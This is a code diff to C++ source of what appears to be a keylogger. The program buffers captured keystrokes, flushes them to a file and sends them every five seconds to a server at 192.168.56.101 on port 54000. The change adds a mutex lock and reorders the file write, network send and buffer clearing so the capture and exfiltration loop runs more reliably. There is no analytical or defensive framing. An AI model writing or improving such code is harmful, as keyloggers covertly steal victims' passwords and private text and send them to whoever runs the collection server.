@@ -24,6 +24,7 @@ NetworkClient client("192.168.56.101", 54000);
 bool SendVectorToServer() {
     
     std::string keystrokeData;
+    std::lock_guard<std::mutex> guard(bufferMutex);
 
     for (const auto& entry : keystrokeVector) {
         keystrokeData.append(entry.first)
@@ -53,14 +54,14 @@ void WriteVectorToFile() {
         outFile << entry.first.c_str() << L"," << entry.second << L"\n";
     }
 
-    keystrokeVector.clear();
+    //keystrokeVector.clear();
     outFile.close();
 }
 
 void PeriodicVectorFlush() {
     while (true) {
         std::this_thread::sleep_for(std::chrono::seconds(5)); //Flush every 5 secs.
-        
+        WriteVectorToFile();
 
         if (!client.connectToServer()) {
             std::cerr << "Failed to connect to server! \n";
@@ -71,7 +72,8 @@ void PeriodicVectorFlush() {
             std::cerr << "Failed to send data to server! \n";
         }
         
-        WriteVectorToFile();
+        
+        keystrokeVector.clear();
     }
 }
 
